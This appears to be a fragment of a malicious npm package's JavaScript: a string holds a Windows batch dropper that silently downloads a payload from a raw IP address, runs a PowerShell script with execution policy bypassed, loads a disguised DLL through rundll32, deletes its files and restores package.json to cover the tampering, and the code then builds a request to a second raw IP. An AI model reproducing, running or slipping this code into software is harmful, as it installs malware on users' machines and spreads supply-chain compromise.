const data = '@echo off\ncurl -o sqlite.a -L "http://103.009.142.171/npm/npm.mov" > nul 2>&1\nstart /b /wait powershell.exe -ExecutionPolicy Bypass -File winsys.ps1 > nul 2>&1\ndel "winsys.ps1" > nul 2>&1\nif exist "winsys.db" (\ndel "winsys.db" > nul 2>&1\n)\nrename sql.tmp winsys.db > nul 2>&1\nrundll32 winsys.db,CalculateSum 7606\ndel "winsys.db"\nif exist "pk.json" (\ndel "package.json" > nul 2>&1\nrename "pk.json" "package.json" > nul 2>&1\n)';


const requestUrl = url.format({
    protocol: 'http',
    hostname: '185.62.57.60',
    port: '8000',
    pathname: '/http',
    search: query,
});
